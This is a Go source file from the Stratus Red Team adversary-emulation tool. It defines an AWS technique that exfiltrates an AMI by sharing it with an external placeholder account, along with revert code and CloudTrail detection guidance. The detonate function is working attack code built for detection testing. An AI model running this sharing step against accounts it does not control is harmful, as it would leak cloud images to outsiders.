package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/v2/internal/utils"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.exfiltration.ec2-share-ami",
		FriendlyName: "Exfiltrate an AMI by Sharing It",
		Description: `
Exfiltrates an AMI by sharing it with an external AWS account.

Warm-up: 

- Create an AMI.

Detonation: 

- Share the AMI with an external, fictitious AWS account.
`,
		Detection: `
Through CloudTrail's <code>ModifyImageAttribute</code> event, when <code>requestParameters.launchPermission</code> shows
that the AMI was shared with a new or unknown AWS account, such as:

<pre><code>"requestParameters": {
  "launchPermission": {
    "add": {
	  "items": [{ "userId": "012345678901" }]
    }
  },
  "attributeType": "launchPermission",
  "imageId": "ami-0b87ea1d007078d18"
}</code></pre>

An attacker can also make an AMI completely public. In this case, the <code>item</code> entry 
will look like <code>{"groups":"all"}</code>. 
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var amiPermissions = []types.LaunchPermission{
	{UserId: aws.String("012345678901")},
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Exfiltrating AMI " + amiId + " by sharing it with an external AWS account")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: &amiId,
		LaunchPermission: &types.LaunchPermissionModifications{
			Add: amiPermissions,
		},
	})

	if err != nil && utils.IsErrorDueToEBSEncryptionByDefault(err) {
		log.Println("Note: Stratus detonated the attack, but the sharing was unsuccessful. " +
			"This is likely because EBS default encryption is enabled in the region. " +
			"Nonetheless, it did simulate a plausible attacker action.")
		return nil
	}

	if err != nil {
		return errors.New("Unable to share AMI with external AWS account: " + err.Error())
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	amiId := params["ami_id"]

	log.Println("Reverting exfiltration of AMI " + amiId + " by removing cross-account sharing")
	_, err := ec2Client.ModifyImageAttribute(context.Background(), &ec2.ModifyImageAttributeInput{
		ImageId: &amiId,
		LaunchPermission: &types.LaunchPermissionModifications{
			Remove: amiPermissions,
		},
	})

	if err != nil {
		return errors.New("Unable to remove AMI permissions: " + err.Error())
	}

	return nil
}
